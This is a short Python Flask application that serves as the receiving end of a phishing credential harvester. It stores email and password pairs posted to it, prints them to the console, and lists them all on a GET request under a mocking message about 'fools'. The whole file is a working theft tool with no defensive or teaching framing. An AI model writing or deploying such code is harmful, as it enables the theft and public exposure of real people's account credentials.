from flask import Flask, render_template, request
import requests as req

app = Flask(__name__)

names = []

@app.route("/", methods=['POST', 'GET'])
def thx_for_creds():
    if request.method == 'POST':
        print(request.form["email"], request.form["password"])
        names.append((request.form["email"], request.form["password"]))
        return ""
    if request.method == 'GET':
        if not names:
            return "Waiting"
        else:
            string = "Thx for the creds to these fools: "
            for name, passwd in names:
                string = string + name + " " + passwd + ", "
            return string
